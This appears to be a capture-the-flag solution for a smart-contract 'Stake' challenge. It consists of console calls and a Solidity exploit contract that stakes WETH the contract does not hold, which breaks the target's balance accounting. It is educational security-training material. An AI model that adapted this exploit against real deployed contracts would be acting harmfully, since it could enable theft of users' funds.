## 1. Stake From `player`

We need to interact directly from our EOA to solve part of the exercise:

```js
// Increasing the ETH balance of the contract, and becoming a staker.
await contract.StakeETH({ value: toWei('0.0010001') })

// Decrease our stake balance to "0", meanwhile keeping our staking status being "true".
await contract.Unstake(toWei('0.0010001'))
// ✅) Our staked status is "true"
// ✅) Our staked balance is equal to "0".
```

## 2. Stake From `StakeSolution` Contract

The rest must be done via a smart contract (e.g. refusing to accept funds):

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 value) external returns (bool);
}

interface IStake {
    function WETH() external view returns (address);
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
}

contract StakeSolution {
    function unbalanceStake(address _stake) external payable {
        require(msg.value > 0.001 ether);
        IStake stake = IStake(_stake);
        stake.StakeETH{ value: msg.value }();
        stake.Unstake(msg.value);
        // Now the `Staker` contract's state is as following:
        // ✅) The ETH balance > 0
        // ❌) The `totalStaked` balance unchanged (i.e. "0")
        // ❌) Therefore, `totalStaked` < ETH balance

        uint256 stakedWETH = msg.value + 1 ether;
        IERC20(stake.WETH()).approve(_stake, stakedWETH);
        IStake(_stake).StakeWETH(stakedWETH);
        // Now the `Staker` contract's state is as following:
        // ✅) The ETH balance > 0
        // ✅) The ETH balance < `totalStaked`
    }

    // Not accepting eth.
    // receive() external payable {}
}
```
